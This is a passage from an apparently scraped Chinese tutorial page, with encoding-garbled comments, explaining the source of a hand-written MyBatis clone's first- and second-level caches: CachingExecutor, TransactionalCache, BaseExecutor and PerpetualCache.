SqlCommandType.valueOf(nodeName.toUpperCase(Locale.ENGLISH));\n\n    boolean isSelect = sqlCommandType == SqlCommandType.SELECT;\n    boolean flushCache = Boolean.parseBoolean(element.attributeValue("flushCache", String.valueOf(!isSelect)));\n    boolean useCache = Boolean.parseBoolean(element.attributeValue("useCache", String.valueOf(isSelect)));\n\n    // è·åé»è®¤è¯­è¨é©±å¨å¨\n    Class<?> langClass = configuration.getLanguageRegistry().getDefaultDriverClass();\n    LanguageDriver langDriver = configuration.getLanguageRegistry().getDriver(langClass);\n\n    // è§£æ<selectKey> step-14 æ°å¢\n    processSelectKeyNodes(id, parameterTypeClass, langDriver);\n\n    // è§£ææSqlSourceï¼DynamicSqlSource/RawSqlSource\n    SqlSource sqlSource = langDriver.createSqlSource(configuration, element, parameterTypeClass);\n\n    // å±æ§æ è®°ãä»å¯¹ insert æç¨ã, MyBatis ä¼éè¿ getGeneratedKeys æèéè¿ insert è¯­å¥ç selectKey å­åç´ è®¾ç½®å®çå¼ step-14 æ°å¢\n    String keyProperty = element.attributeValue("keyProperty");\n\n    KeyGenerator keyGenerator = null;\n    String keyStatementId = id + SelectKeyGenerator.SELECT_KEY_SUFFIX;\n    keyStatementId = builderAssistant.applyCurrentNamespace(keyStatementId, true);\n\n    if (configuration.hasKeyGenerator(keyStatementId)) {\n        keyGenerator = configuration.getKeyGenerator(keyStatementId);\n    } else {\n        keyGenerator = configuration.isUseGeneratedKeys() && SqlCommandType.INSERT.equals(sqlCommandType) ? new Jdbc3KeyGenerator() : new NoKeyGenerator();\n    }\n    // è°ç¨å©æç±»\n    builderAssistant.addMappedStatement(id,\n            sqlSource,\n            sqlCommandType,\n            parameterTypeClass,\n            resultMap,\n            resultTypeClass,\n            flushCache,\n            useCache,\n            keyGenerator,\n            keyProperty,\n            langDriver);\n}\n\n// æä¿¡æ¯æ·»å å° MappedStatementå¯¹è±¡\npublic MappedStatement addMappedStatement(\n        String id,\n        SqlSource sqlSource,\n        SqlCommandType sqlCommandType,\n        Class<?> parameterType,\n        String resultMap,\n        Class<?> resultType,\n        boolean flushCache,\n        boolean useCache,\n        KeyGenerator keyGenerator,\n        String keyProperty,\n        LanguageDriver lang\n) {\n    // ç»idå ä¸namespaceåç¼ï¼cn.bugstack.mybatis.test.dao.IUserDao.queryUserInfoById\n    id = applyCurrentNamespace(id, false);\n    //æ¯å¦æ¯selectè¯­å¥\n    boolean isSelect = sqlCommandType == SqlCommandType.SELECT;\n\n    MappedStatement.Builder statementBuilder = new MappedStatement.Builder(configuration, id, sqlCommandType, sqlSource, resultType);\n    statementBuilder.resource(resource);\n    statementBuilder.keyGenerator(keyGenerator);\n    statementBuilder.keyProperty(keyProperty);\n\n    // ç»ææ å°ï¼ç» MappedStatement#resultMaps\n    setStatementResultMap(resultMap, resultType, statementBuilder);\n    // ç»´æ¤ç¼å­ä¿¡æ¯\n    setStatementCache(isSelect, flushCache, useCache, currentCache, statementBuilder);\n    MappedStatement statement = statementBuilder.build();\n    // æ å°è¯­å¥ä¿¡æ¯ï¼å»ºé å®å­æ¾å°éç½®é¡¹ä¸­\n    configuration.addMappedStatement(statement);\n    return statement;\n}\n\n// ç»Statementæ·»å ç¼å­ä¿¡æ¯\nprivate void setStatementCache(\n        boolean isSelect,\n        boolean flushCache,\n        boolean useCache,\n        Cache cache,\n        MappedStatement.Builder statementBuilder) {\n    flushCache = valueOrDefault(flushCache, !isSelect);\n    useCache = valueOrDefault(useCache, isSelect);\n    statementBuilder.flushCacheRequired(flushCache);\n    statementBuilder.useCache(useCache);\n    statementBuilder.cache(cache);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n\n\nå¨å·ä½ç addMappedStatement çæ¶åï¼å¯ä»¥çå°ä¼å¾å°ä¸ä¸ª MappedStatement å¯¹è±¡ï¼è¯¥å¯¹è±¡å°±æ¯å°è£äº SQL æ ç­¾çææä¿¡æ¯ï¼å¨ setStatementCache æ¹æ³ä¸­ï¼ä¸ä»åªæ flushCacheåuseCache è¿è¡äºè®¾ç½®ï¼é¢å¤çè¿å¸¦æä¸ä¸ª cache ï¼è¯¥ cache å°±æ¯å¨è°ç¨ useNewCache æ¹æ³ï¼åé¨èµå¼ç currentCache ï¼ä»ä»¬çæ¹æ³æ¯å¨åä¸ä¸ªç±»ä¸­ï¼å æ­¤å¯ä»¥ä½¿ç¨ãè¿æ · MappedStatement å¯¹è±¡ä¹å°±æ¥æäº <cache> æ ç­¾çè½åï¼å°æ­¤è§£æå®æ¯\n\n\n# åå¤\n\nåä¸çº§ç¼å­ä¸æ ·ï¼é½æ¯å¨ openSession çæ¶åå»åå®ä¾åï¼ä½æ¯ä¸åçæ¯ï¼äºçº§ç¼å­ä¼å¨ä¸çº§ç¼å­ä¸è¿è¡ä¸ä¸ªè£é¥°ï¼å¹¶ä¸é¦è¦ä¼å¤æ­æ¯å¦åè®¸å¼å¯äºçº§ç¼å­ã\n\nif (cacheEnabled) {\n    executor = new CachingExecutor(executor);\n}\n\n\n1\n2\n3\n\n\nCachingExecutor æ¥æ¶ executor ï¼å¹¶å¯¹å¶è¿è¡åè£ï¼åé¨æ¹æ³ä¾ç¶è°ç¨çæ¯ BaseExecutor çç¸å³æ¹æ³ã CachingExecutor åé¨è¿ç»´æ¤äº TransactionalCacheManager äºå¡ç¼å­ç®¡çå¨ï¼è¯¥ç®¡çå¨åé¨ç»´æ¤ Map<Cache, TransactionalCache> ï¼ TransactionalCache åé¨åç»´æ¤äº Cache ä»¥å entriesMissedInCache å entriesToAddOnCommit\n\n\n# æ§è¡\n\npublic class CachingExecutor implements Executor {\n\n    private Logger logger = LoggerFactory.getLogger(CachingExecutor.class);\n    private Executor delegate;\n    // äºå¡ç¼å­ç®¡çå¨\n    private TransactionalCacheManager tcm = new TransactionalCacheManager();\n\n    public CachingExecutor(Executor delegate) {\n        this.delegate = delegate;\n        delegate.setExecutorWrapper(this);\n    }\n\n    @Override\n    public int update(MappedStatement ms, Object parameter) throws SQLException {\n        return delegate.update(ms, parameter);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        Cache cache = ms.getCache();\n        if (cache != null) {\n            flushCacheIfRequired(ms);\n            if (ms.isUseCache() && resultHandler == null) {\n                @SuppressWarnings("unchecked")\n                List<E> list = (List<E>) tcm.getObject(cache, key);\n                if (list == null) {\n                    list = delegate.<E>query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n                    // cacheï¼ç¼å­éåå®ç°ç±»ï¼FIFO\n                    // keyï¼åå¸å¼ [mappedStatementId + offset + limit + SQL + queryParams + environment]\n                    // listï¼æ¥è¯¢çæ°æ®\n                    tcm.putObject(cache, key, list);\n                }\n                // æå°è°è¯æ¥å¿ï¼è®°å½äºçº§ç¼å­è·åæ°æ®\n                if (logger.isDebugEnabled() && cache.getSize() > 0) {\n                    logger.debug("äºçº§ç¼å­ï¼{}", JSON.toJSONString(list));\n                }\n                return list;\n            }\n        }\n        return delegate.<E>query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException {\n        // 1. è·åç»å®SQL\n        BoundSql boundSql = ms.getBoundSql(parameter);\n        // 2. åå»ºç¼å­Key\n        CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql);\n        return query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public Transaction getTransaction() {\n        return delegate.getTransaction();\n    }\n\n    @Override\n    public void commit(boolean required) throws SQLException {\n        delegate.commit(required);\n        tcm.commit();\n    }\n\n    @Override\n    public void rollback(boolean required) throws SQLException {\n        try {\n            delegate.rollback(required);\n        } finally {\n            if (required) {\n                tcm.rollback();\n            }\n        }\n    }\n\n    @Override\n    public void close(boolean forceRollback) {\n        try {\n            if (forceRollback) {\n                tcm.rollback();\n            } else {\n                tcm.commit();\n            }\n        } finally {\n            delegate.close(forceRollback);\n        }\n    }\n\n    @Override\n    public void clearLocalCache() {\n        delegate.clearLocalCache();\n    }\n\n    @Override\n    public CacheKey createCacheKey(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql) {\n        return delegate.createCacheKey(ms, parameterObject, rowBounds, boundSql);\n    }\n\n    @Override\n    public void setExecutorWrapper(Executor executor) {\n        throw new UnsupportedOperationException("This method should not be called");\n    }\n\n    private void flushCacheIfRequired(MappedStatement ms) {\n        Cache cache = ms.getCache();\n        if (cache != null && ms.isFlushCacheRequired()) {\n            tcm.clear(cache);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n\n\npublic class TransactionalCacheManager {\n\n    private Map<Cache, TransactionalCache> transactionalCaches = new HashMap<>();\n\n    public void clear(Cache cache) {\n        getTransactionalCache(cache).clear();\n    }\n\n    /**\n     * å¾å°æä¸ªTransactionalCacheçå¼\n     */\n    public Object getObject(Cache cache, CacheKey key) {\n        return getTransactionalCache(cache).getObject(key);\n    }\n\n    public void putObject(Cache cache, CacheKey key, Object value) {\n        getTransactionalCache(cache).putObject(key, value);\n    }\n\n    /**\n     * æäº¤æ¶å¨é¨æäº¤\n     */\n    public void commit() {\n        for (TransactionalCache txCache : transactionalCaches.values()) {\n            txCache.commit();\n        }\n    }\n\n    /**\n     * åæ»æ¶å¨é¨åæ»\n     */\n    public void rollback() {\n        for (TransactionalCache txCache : transactionalCaches.values()) {\n            txCache.rollback();\n        }\n    }\n\n    private TransactionalCache getTransactionalCache(Cache cache) {\n        TransactionalCache txCache = transactionalCaches.get(cache);\n        if (txCache == null) {\n            txCache = new TransactionalCache(cache);\n            transactionalCaches.put(cache, txCache);\n        }\n        return txCache;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\npublic class TransactionalCache implements Cache {\n\n    private Cache delegate;\n    // commit æ¶è¦ä¸è¦æ¸ç¼å­\n    private boolean clearOnCommit;\n    // commit æ¶è¦æ·»å çåç´ \n    private Map<Object, Object> entriesToAddOnCommit;\n    private Set<Object> entriesMissedInCache;\n\n    public TransactionalCache(Cache delegate) {\n        // delegate = FifoCache\n        this.delegate = delegate;\n        // é»è®¤ commit æ¶ä¸æ¸ç¼å­\n        this.clearOnCommit = false;\n        this.entriesToAddOnCommit = new HashMap<>();\n        this.entriesMissedInCache = new HashSet<>();\n    }\n\n    @Override\n    public String getId() {\n        return delegate.getId();\n    }\n\n    @Override\n    public int getSize() {\n        return delegate.getSize();\n    }\n\n    @Override\n    public Object getObject(Object key) {\n        // keyï¼CacheKey æ¼è£åçåå¸ç \n        Object object = delegate.getObject(key);\n        if (object == null) {\n            entriesMissedInCache.add(key);\n        }\n        return clearOnCommit ? null : object;\n    }\n\n    @Override\n    public void putObject(Object key, Object object) {\n        entriesToAddOnCommit.put(key, object);\n    }\n\n    @Override\n    public Object removeObject(Object key) {\n        return null;\n    }\n\n    @Override\n    public void clear() {\n        clearOnCommit = true;\n        entriesToAddOnCommit.clear();\n    }\n\n    public void commit() {\n        if (clearOnCommit) {\n            delegate.clear();\n        }\n        flushPendingEntries();\n        reset();\n    }\n\n    public void rollback() {\n        unlockMissedEntries();\n        reset();\n    }\n\n    private void reset() {\n        clearOnCommit = false;\n        entriesToAddOnCommit.clear();\n        entriesMissedInCache.clear();\n    }\n\n    /**\n     * å·æ°æ°æ®å° MappedStatement#Cache ä¸­ï¼ä¹å°±æ¯ææ°æ®å¡«åå° Mapper XML çº§å«ä¸ã\n     * flushPendingEntries æ¹æ³æäºå¡ç¼å­ä¸çæ°æ®ï¼å¡«åå° FifoCache ä¸­ã\n     */\n    private void flushPendingEntries() {\n        for (Map.Entry<Object, Object> entry : entriesToAddOnCommit.entrySet()) {\n            delegate.putObject(entry.getKey(), entry.getValue());\n        }\n        for (Object entry : entriesMissedInCache) {\n            if (!entriesToAddOnCommit.containsKey(entry)) {\n                delegate.putObject(entry, null);\n            }\n        }\n    }\n\n    private void unlockMissedEntries() {\n        for (Object entry : entriesMissedInCache) {\n            delegate.putObject(entry, null);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\nå¶å®ä¸é¢é¥¶äºä¸åä¸æ¥ï¼æç»æä½çæ¯ MappedStatement ç»´æ¤ç Cache å¯¹è±¡ï¼ MappedStatement æ¯è¢«å¨å± Configuration å¨ç¼å­çï¼æä»¥æ¥è¯¢ç»æä¸ä¼æ¸é¤ MappedStatement å¯¹è±¡åç¼å­ä¿¡æ¯ï¼åªæå½è§¦å updateï¼commitï¼rollback ç­æä¼æ¸é¤ MappedStatement éç»´æ¤çç¼å­ä¿¡æ¯',normalizedContent:'mybatis çç¼å­åä¸ºä¸çº§ç¼å­åäºçº§ç¼å­ï¼ç¼å­æåµå¦ä¸å¾ï¼åæå¡æ¶æä¸­ï¼æä¸ä»æåªæä¸ä¸ªç¨åºæä¾ç¸åæå¡ï¼ï¼ä¸çº§ç¼å­å¼å¯ä¸ä¼å½±åä¸å¡ï¼åªä¼æé«æ§è½ã å¾®æå¡æ¶æä¸­éè¦å³é­ä¸çº§ç¼å­ï¼åå ï¼service1 åæ¥è¯¢æ°æ®ï¼è¥ä¹å service2 ä¿®æ¹äºæ°æ®ï¼ä¹å service1 ååæ¬¡ä»¥åæ ·çæ¥è¯¢æ¡ä»¶æ¥è¯¢æ°æ®ï¼å èµ°ç¼å­ä¼åºç°æ¥å¤çæ°æ®ä¸æ¯ææ°æ°æ®\n\n\n\n\n# ä¸çº§ç¼å­\n\nä¸çº§ç¼å­æ¯åºäº sqlsession çº§å«çï¼å¨åä¸ä¸ª session çç¸åæ¥è¯¢è¯­å¥ä¼æä¼ä»ç¼å­ä¸­æ¥è¯¢ï¼æè°ç¸ååæ¬ sql ç¸åï¼æ¡ä»¶ç¸åç­ï¼é£ä¹æä»¬çä¸å¨æºç ä¸­å·ä½æ¯æä¹ç»´æ¤åä½¿ç¨è¿ä¸ªç¼å­çã\n\n\n# è§£æ\n\næè¿°ä¸çº§ç¼å­åªéè¦å¨ <configuration> æ ç­¾ä¸­æè¿°å³å¯ï¼èä¸çº§ç¼å­ç value å¼æ session å statement ä¸¤ç§ï¼å¦æè®¾ç½®ä¸º statement å³é­ä¸çº§ç¼å­ï¼ä¸çº§ç¼å­æ¯ mybatis æä¾çé»è®¤ç¼å­\n\n<configuration>\n    <settings>\n        \x3c!--ç¼å­çº§å«ï¼session/statement--\x3e\n        <setting name="localcachescope" value="session"/>\n    </settings>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\nè§£ææ ¸å¿ä»£ç ä¼å¾å° localcachescopeçå¼ ï¼ç»´æ¤å° configuration å¨å±éç½®ä¸­\n\nprivate void settingselement(element context) {\n    if (context == null) return;\n    list<element> elements = context.elements();\n    properties props = new properties();\n    for (element element : elements) {\n        props.setproperty(element.attributevalue("name"), element.attributevalue("value"));\n    }\n    // æ¯å¦å¯ç¨äºçº§ç¼å­\n    configuration.setcacheenabled(booleanvalueof(props.getproperty("cacheenabled"), true));\n    // ä¸çº§ç¼å­çéç½®\n    configuration.setlocalcachescope(localcachescope.valueof(props.getproperty("localcachescope")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# åå¤\n\nåå¤é¶æ®µä¸»è¦æ¯å¨ opensession æ¹æ³ï¼ä»ä¼å¨æ§è¡å¨éé¢å»ç´æ¥ new perpetualcache æ°¸ä¹ç¼å­ï¼æ§è¡å¨å°±æ¥æäºè¿ä¸ªç¼å­å¯¹è±¡\n\n// æå¼ä¸ä¸ª session\n@override\npublic sqlsession opensession() {\n    transaction tx = null;\n    try {\n        final environment environment = configuration.getenvironment();\n        transactionfactory transactionfactory = environment.gettransactionfactory();\n        tx = transactionfactory.newtransaction(configuration.getenvironment().getdatasource(), transactionisolationlevel.read_committed, false);\n        // åå»ºæ§è¡å¨\n        final executor executor = configuration.newexecutor(tx);\n        // åå»ºdefaultsqlsession\n        return new defaultsqlsession(configuration, executor);\n    } catch (exception e) {\n        try {\n            assert tx != null;\n            tx.close();\n        } catch (sqlexception ignore) {\n        }\n        throw new runtimeexception("error opening session.  cause: " + e);\n    }\n}\n\n// åå»ºæ§è¡å¨\npublic executor newexecutor(transaction transaction) {\n    executor executor = new simpleexecutor(this, transaction);\n    // éç½®å¼å¯äºçº§ç¼å­ï¼åå»º cachingexecutor(é»è®¤å°±æ¯æç¼å­)è£é¥°èæ¨¡å¼ï¼\n    if (cacheenabled) {\n        executor = new cachingexecutor(executor);\n    }\n    return executor;\n}\n\n// simpleexecutor ç®åæ§è¡å¨çæé æ¹æ³\npublic class simpleexecutor extends baseexecutor {\n    public simpleexecutor(configuration configuration, transaction transaction) {\n        super(configuration, transaction);\n    }\n}\n\n// åºç¡æ§è¡å¨çæé æ¹æ³\nprotected baseexecutor(configuration configuration, transaction transaction) {\n    this.configuration = configuration;\n    this.transaction = transaction;\n    this.wrapper = this;\n    // new ä¸ä¸ªæ°¸ä¹ç¼å­\n    this.localcache = new perpetualcache("localcache");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\nperpetualcache ç»§æ¿äº cache ï¼å¹¶å®ç°äºåºæ¬çå¯¹ç¼å­çæä½\n\npublic class perpetualcache implements cache {\n    private string id;\n    // ä½¿ç¨hashmapå­æ¾ä¸çº§ç¼å­æ°æ®ï¼session çå½å¨æè¾ç­ï¼æ­£å¸¸æåµä¸æ°æ®ä¸ä¼ä¸ç´å¨ç¼å­å­æ¾\n    private map<object, object> cache = new hashmap<>();\n    public perpetualcache(string id) {\n        this.id = id;\n    }\n    @override\n    public string getid() {\n        return id;\n    }\n    @override\n    public void putobject(object key, object value) {\n        cache.put(key, value);\n    }\n    @override\n    public object getobject(object key) {\n        return cache.get(key);\n    }\n    @override\n    public object removeobject(object key) {\n        return cache.remove(key);\n    }\n    @override\n    public void clear() {\n        cache.clear();\n    }\n    @override\n    public int getsize() {\n        return cache.size();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# æ§è¡\n\nå¨åå¤é¶æ®µå·²ç»å¾å°äºæ§è¡å¨ï¼å¹¶å¨æ§è¡å¨éé¢å¾å°äº perpetualcache ç¼å­ï¼åªéè¦ç¥éå®¢æ·ä½¿ç¨çæ¯æ¥è¯¢è¿æ¯ä¿®æ¹ç­æä½åï¼æ§è¡æ§è¡å¨éé¢å¯¹åºç query or update æ¹æ³å³å¯ï¼æ ¸å¿ç query\n\npublic abstract class baseexecutor implements executor {\n\n    private org.slf4j.logger logger = loggerfactory.getlogger(baseexecutor.class);\n\n    protected configuration configuration;\n    protected transaction transaction;\n    protected executor wrapper;\n\n    // æ¬å°ç¼å­\n    protected perpetualcache localcache;\n\n    private boolean closed;\n    // æ¥è¯¢å æ \n    protected int querystack = 0;\n\n    protected baseexecutor(configuration configuration, transaction transaction) {\n        this.configuration = configuration;\n        this.transaction = transaction;\n        this.wrapper = this;\n        this.localcache = new perpetualcache("localcache");\n    }\n\n    @override\n    public int update(mappedstatement ms, object parameter) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        clearlocalcache();\n        return doupdate(ms, parameter);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler) throws sqlexception {\n        // 1. è·åç»å®sql\n        boundsql boundsql = ms.getboundsql(parameter);\n        // 2. åå»ºç¼å­key\n        cachekey key = createcachekey(ms, parameter, rowbounds, boundsql);\n        return query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        // æ¸çå±é¨ç¼å­ï¼æ¥è¯¢å æ ä¸º0åæ¸çãquerystack é¿åéå½è°ç¨æ¸ç\n        if (querystack == 0 && ms.isflushcacherequired()) {\n            clearlocalcache();\n        }\n        list<e> list;\n        try {\n            querystack++;\n            // æ ¹æ®cachekeyä»localcacheä¸­æ¥è¯¢æ°æ®\n            list = resulthandler == null ? (list<e>) localcache.getobject(key) : null;\n            if (list == null) {\n                list = queryfromdatabase(ms, parameter, rowbounds, resulthandler, key, boundsql);\n            }\n        } finally {\n            querystack--;\n        }\n        if (querystack == 0) {\n            // å¦æä¸æ¯ session æ¨¡å¼ï¼åæ¸é¤ç¼å­\n            if (configuration.getlocalcachescope() == localcachescope.statement) {\n                clearlocalcache();\n            }\n        }\n        return list;\n    }\n\n    private <e> list<e> queryfromdatabase(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        list<e> list;\n        localcache.putobject(key, executionplaceholder.execution_placeholder);\n        try {\n            list = doquery(ms, parameter, rowbounds, resulthandler, boundsql);\n        } finally {\n            localcache.removeobject(key);\n        }\n        // å­å¥ç¼å­\n        localcache.putobject(key, list);\n        return list;\n    }\n\n    protected abstract int doupdate(mappedstatement ms, object parameter) throws sqlexception;\n\n    protected abstract <e> list<e> doquery(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, boundsql boundsql) throws sqlexception;\n\n    @override\n    public transaction gettransaction() {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        return transaction;\n    }\n\n    @override\n    public void commit(boolean required) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("cannot commit, transaction is already closed");\n        }\n        clearlocalcache();\n        if (required) {\n            transaction.commit();\n        }\n    }\n\n    @override\n    public void rollback(boolean required) throws sqlexception {\n        if (!closed) {\n            try {\n                clearlocalcache();\n            } finally {\n                if (required) {\n                    transaction.rollback();\n                }\n            }\n        }\n    }\n\n    @override\n    public void clearlocalcache() {\n        if (!closed) {\n            localcache.clear();\n        }\n    }\n\n    @override\n    public cachekey createcachekey(mappedstatement ms, object parameterobject, rowbounds rowbounds, boundsql boundsql) {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        cachekey cachekey = new cachekey();\n        cachekey.update(ms.getid());\n        cachekey.update(rowbounds.getoffset());\n        cachekey.update(rowbounds.getlimit());\n        cachekey.update(boundsql.getsql());\n        list<parametermapping> parametermappings = boundsql.getparametermappings();\n        typehandlerregistry typehandlerregistry = ms.getconfiguration().gettypehandlerregistry();\n        for (parametermapping parametermapping : parametermappings) {\n            object value;\n            string propertyname = parametermapping.getproperty();\n            if (boundsql.hasadditionalparameter(propertyname)) {\n                value = boundsql.getadditionalparameter(propertyname);\n            } else if (parameterobject == null) {\n                value = null;\n            } else if (typehandlerregistry.hastypehandler(parameterobject.getclass())) {\n                value = parameterobject;\n            } else {\n                metaobject metaobject = configuration.newmetaobject(parameterobject);\n                value = metaobject.getvalue(propertyname);\n            }\n            cachekey.update(value);\n        }\n        if (configuration.getenvironment() != null) {\n            cachekey.update(configuration.getenvironment().getid());\n        }\n        return cachekey;\n    }\n\n    @override\n    public void setexecutorwrapper(executor executor) {\n        this.wrapper = wrapper;\n    }\n\n    @override\n    public void close(boolean forcerollback) {\n        try {\n            try {\n                rollback(forcerollback);\n            } finally {\n                transaction.close();\n            }\n        } catch (sqlexception e) {\n            logger.warn("unexpected exception on closing transaction.  cause: " + e);\n        } finally {\n            transaction = null;\n            localcache = null;\n            closed = true;\n        }\n    }\n\n    protected void closestatement(statement statement) {\n        if (statement != null) {\n            try {\n                statement.close();\n            } catch (sqlexception ignore) {\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n\n\nå¯ä»¥çå° æ§è¡å¨éé¢ç»´æ¤äº query update commit ç­æ¹æ³ï¼å¨æ§è¡æ¥è¯¢çæ¶åä¼åçæ cachekey ï¼ä¼æç§ namespace.id + åé¡µoffset + åé¡µlimit + æ§è¡çsqlè¯­å¥ + æ¥è¯¢æ¡ä»¶çå¼ + ç¯å¢id çæå¯ä¸ç keyï¼ç¶ååä¸ºæ¥è¯¢ç¼å­ç keyï¼æ¥è¯¢ç»æåä¸º valueï¼å¦æåä¸å sqlsession æ§è¡ç¸åè¯­å¥åæ¡ä»¶ä»¥ååé¡µç­ï¼å°±ä¼ä»ç¼å­ä¸­å½ä¸­å¹¶è¿åç»æãç¼å­çæ¸é¤ï¼å°±æ¯å½è¯¥ sqlsession æ§è¡ updateï¼commitï¼closeï¼rollback æ¶è¯¥ sqlsession å°±æ¸é¤ç¼å­ã\n\nå¨ sql è¯­å¥ä¸­ä¹å¯ä»¥è®¾ç½®æ¸é¤ç¼å­ï¼åªéè¦å¨ <select>ã<insert> å <update> ç­ sql æ ç­¾ä¸­è®¾ç½® flushcache="true" å±æ§ä¼å¼ºå¶æ¸ç©ºæ¬å°ç¼å­ï¼ä½¿å¾ä¸æ¬¡æ¥è¯¢æ¶éæ°ä»æ°æ®åºä¸­è·åæ°æ®ãéç¨äºä¸çº§ç¼å­åäºçº§ç¼å­\n\n<select id="selectbyid" resulttype="com.example.user" flushcache="true">\n  select * from user where id = #{id}\n</select>\n\n\n1\n2\n3\n\n\nè¿æå°±æ¯å¨ query æ¥è¯¢ä¸­ï¼å½å¦æä½ è®¾ç½® localcachescope = statement æ¶ï¼å¨ query ä¹ä¼èªå¨æ¸é¤ç¼å­ï¼ä¹å°±æ¯æä»¬æè¯´çå³é­ä¸çº§ç¼å­çæ¹æ³\n\n\n# äºçº§ç¼å­\n\näºçº§ç¼å­æ¯ä¸º namespace ä¹å« mapper çº§å«çç¼å­ï¼æ¯è·¨ sqlsession çï¼ä»ä¼å¨åæçæ§è¡å¨ä¸å°è£ä¸ä¸ª cachingexecutor ï¼æ¥ç®¡çç¼å­ï¼ cachingexecutor ä½¿ç¨äºè£é¥°å¨æ¨¡å¼æ¥è£é¥°åºç¡ç executor æ§è¡å¨ã\n\n\n# è§£æ\n\nå¨äºçº§ç¼å­ä¸­çéç½®æ¹å¼å·ä½å¦ä¸\n\n\x3c!-- å¿é¡»åå¼å¯ç¼å­ --\x3e\n<configuration>\n    <settings>\n        \x3c!--  true/false äºçº§ç¼å­æ¯å¦ä½¿ç¨ --\x3e\n        <setting name="cacheenabled" value="true"/>\n    </settings>\n</configuration>\n\n\x3c!-- 